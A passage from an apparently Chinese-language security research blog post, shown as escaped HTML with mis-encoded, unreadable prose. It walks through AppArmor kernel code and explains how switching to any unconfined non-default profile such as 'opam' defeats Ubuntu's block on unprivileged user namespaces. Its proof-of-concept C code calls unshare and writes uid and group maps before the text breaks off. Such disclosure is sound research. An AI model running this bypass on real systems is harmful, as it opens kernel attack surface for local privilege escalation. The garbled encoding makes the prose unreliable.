        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;exec&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_change_profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AA_CHANGE_ONEXEC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;stack&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_change_profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AA_CHANGE_ONEXEC&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
                             &lt;span class=&quot;n&quot;&gt;AA_CHANGE_STACK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa_change_profile()&lt;/code&gt; æœƒæ ¹æ“šä¸åŒçš„ flag ä¾†æ±ºå®šå¦‚ä½•å¥—ç”¨æŒ‡å®šçš„è¨­å®šæª”ã€‚é¦–å…ˆï¼Œå®ƒæœƒæ ¹æ“šä½¿ç”¨è€…è¼¸å…¥çš„è¨­å®šæª”åç¨±ï¼Œæ‰¾å‡ºå°æ‡‰çš„è¨­å®šæª”ç‰©ä»¶ [10]ï¼Œç„¶å¾Œæ ¹æ“š flag çš„å…§å®¹åŸ·è¡Œä¸åŒçš„æ›´æ–°é‚è¼¯ã€‚è‹¥åŒ…å« &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AA_CHANGE_STACK&lt;/code&gt; flagï¼ŒAppArmor æœƒå°‡æ–°çš„è¨­å®šç–ŠåŠ åœ¨ç¾æœ‰è¨­å®šæª”ä¹‹ä¸Šã€‚è‹¥æ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AA_CHANGE_TEST&lt;/code&gt; flagï¼Œå‰‡ä»£è¡¨é€™æ¬¡æ“ä½œåƒ…ç”¨æ–¼æ¸¬è©¦ï¼Œä¸¦ä¸æœƒçœŸæ­£å¥—ç”¨è¨­å®šæª”ã€‚&lt;/p&gt;

&lt;p&gt;å¦‚æœæ—¢æ²’æœ‰è¨­å®š &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AA_CHANGE_STACK&lt;/code&gt;ï¼Œä¹Ÿæ²’æœ‰è¨­å®š &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AA_CHANGE_TEST&lt;/code&gt;ï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa_change_profile()&lt;/code&gt; æœƒä½¿ç”¨å‰›å‰›å–å¾—çš„è¨­å®šæª”å»ºç«‹ä¸€å€‹æ–°çš„ AppArmor æ¨™ç±¤ï¼ˆlabelï¼‰ç‰©ä»¶ [11]ï¼Œç„¶å¾Œé€é &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa_replace_current_label()&lt;/code&gt; [12] æˆ– &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa_set_current_onexec()&lt;/code&gt; [13] å°‡é€™å€‹æ–°æ¨™ç±¤å¥—ç”¨åˆ°ç›®å‰çš„ç¨‹å¼ä¸Šã€‚&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;aa_change_profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fqname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_label&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_label_parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fqname&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* profile name */&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GFP_KERNEL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [10]&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fn_label_build_in_ns&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GFP_KERNEL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [11]&lt;/span&gt;
                       &lt;span class=&quot;n&quot;&gt;aa_get_label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
                       &lt;span class=&quot;n&quot;&gt;aa_get_label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AA_CHANGE_ONEXEC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_replace_current_label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [12]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;aa_put_label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;aa_set_current_onexec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [13]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ç°¡è€Œè¨€ä¹‹ï¼Œè‹¥å¯«å…¥çš„ç›®æ¨™æ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/self/attr/exec&lt;/code&gt;ï¼Œä¸”å…§å®¹ç‚º &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;exec &amp;lt;è¨­å®šæª”åç¨±&amp;gt;&quot;&lt;/code&gt;ï¼Œé‚£éº¼æ–°çš„ AppArmor è¨­å®šæª”æœƒåœ¨ç¨‹å¼åŸ·è¡Œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_execve&lt;/code&gt; ç³»çµ±å‘¼å«å¾Œè¢«å¥—ç”¨ã€‚&lt;/p&gt;

&lt;p&gt;ç›¸ååœ°ï¼Œè‹¥æ˜¯å¯«å…¥ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/self/attr/current&lt;/code&gt; ä¸¦ä½¿ç”¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;changeprofile &amp;lt;è¨­å®šæª”åç¨±&amp;gt;&quot;&lt;/code&gt;ï¼Œå‰‡è©²ç¨‹å¼çš„è¨­å®šæª”æœƒç«‹å³è¢«æ›´æ–°ã€‚&lt;/p&gt;

&lt;h2 id=&quot;4-out-of-the-sandbox&quot;&gt;4. Out of the Sandbox&lt;/h2&gt;

&lt;p&gt;ç¾åœ¨è®“æˆ‘å€‘å›éé ­ä¾†çœ‹ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa_profile_ns_perm()&lt;/code&gt; ä¸­çš„æª¢æŸ¥é‚è¼¯ã€‚&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_label&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;aa_profile_ns_perm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_profile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* ... */&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile_unconfined&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [1]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;profiles_ns&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unconfined&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [2]&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ç¬¬ä¸€å€‹æª¢æŸ¥æ˜¯åˆ¤æ–·ç›®å‰çš„è¨­å®šæª”æ˜¯å¦è™•æ–¼ unconfined ç‹€æ…‹ [1]ã€‚é€™å€‹æ¢ä»¶å¯ä»¥é€éå¥—ç”¨ä¸€å€‹å¼·åˆ¶æ¨¡å¼ï¼ˆEnforced modeï¼‰æˆ–å›å ±æ¨¡å¼ï¼ˆComplain modeï¼‰çš„è¨­å®šæª”ä¾†ç¹éã€‚&lt;/p&gt;

&lt;p&gt;ç¬¬äºŒå€‹æª¢æŸ¥å‰‡æ˜¯ç¢ºèªç›®å‰çš„è¨­å®šæª”æ˜¯å¦å°±æ˜¯ç³»çµ±é è¨­çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unconfined&lt;/code&gt; è¨­å®šæª” [2]ã€‚å› æ­¤ï¼Œåªè¦æ”¹ç”¨ä¸€å€‹éé è¨­çš„è¨­å®šæª”ï¼Œé€™å€‹æª¢æŸ¥åŒæ¨£ä¹Ÿå¯ä»¥è¢«ç¹éã€‚&lt;/p&gt;

&lt;p&gt;ç¸½çµä¾†èªªï¼Œåœ¨ç›®å‰é€™å¥—æ©Ÿåˆ¶ä¸‹ï¼Œåªè¦å¥—ç”¨ä»»æ„ä¸€å€‹è™•æ–¼ unconfined ç‹€æ…‹çš„ AppArmor è¨­å®šæª”ï¼Œå°±èƒ½ç¹éé€™äº›æª¢æŸ¥ï¼ŒæˆåŠŸå»ºç«‹éç‰¹æ¬Šä½¿ç”¨è€…å‘½åç©ºé–“ï¼&lt;/p&gt;

&lt;h2 id=&quot;5-proof-of-concept&quot;&gt;5. Proof-Of-Concept&lt;/h2&gt;

&lt;p&gt;è¦ç¹é Ubuntu çš„ä¿è­·æ©Ÿåˆ¶ï¼Œå°±åªéœ€è¦æŠŠç¨‹å¼çš„ AppArmor è¨­å®šæª”å¾é è¨­çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unconfined&lt;/code&gt; è¨­å®šæª”ï¼Œæ›æˆå…¶ä»–ä»»æ„ä¸€å€‹è™•æ–¼ unconfined ç‹€æ…‹çš„è¨­å®šæª”å³å¯ã€‚é€™é‚Šæˆ‘å€‘é¸æ“‡ç”¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;opam&lt;/code&gt; é€™å€‹è¨­å®šæª”ï¼Œå–®ç´”åªæ˜¯å› ç‚ºå®ƒæ“ä½œå–®ç´”ã€æ²’æœ‰é¡å¤–çš„è¡Œç‚ºã€‚è¨­å®šæª”çš„å…§å®¹å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# This profile allows everything and only exists to give the
# application a name instead of having the label &quot;unconfined&quot;

abi &amp;lt;abi/4.0&amp;gt;,
include &amp;lt;tunables/global&amp;gt;

profile opam /usr/bin/opam flags=(unconfined) {
  userns,

  # Site-specific additions and overrides. See local/README for details.
  include if exists &amp;lt;local/opam&amp;gt;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ä¸‹æ–¹ç¯„ä¾‹ç¨‹å¼ç¢¼å±•ç¤ºäº†å…©ç¨®æ–¹æ³•ï¼ŒæˆåŠŸåœ¨ Ubuntu 24.10 ä¸Šå»ºç«‹éç‰¹æ¬Šä½¿ç”¨è€…å‘½åç©ºé–“ã€‚æ¸¬è©¦ç’°å¢ƒç‚º Ubuntu 24.10ï¼ˆæ ¸å¿ƒç‰ˆæœ¬ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;6.11.0-14-generic&lt;/code&gt;ï¼‰ï¼Œæ¸¬è©¦æ—¥æœŸç‚º 2025 å¹´ 2 æœˆ 17 æ—¥ã€‚&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define _GNU_SOURCE
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;sched.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;fcntl.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;perror_exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;perror&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;unshare_setup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uid_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gid_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{};&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unshare&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CLONE_NEWNET&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CLONE_NEWUSER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;perror_exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;unshare&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    
    &lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/proc/self/setgroups&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;O_WRONLY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;perror_exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;open /proc/self/setgroups&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    
    &lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;deny&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;deny&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    
    &lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/proc/self/uid_map&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;O_WRONLY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
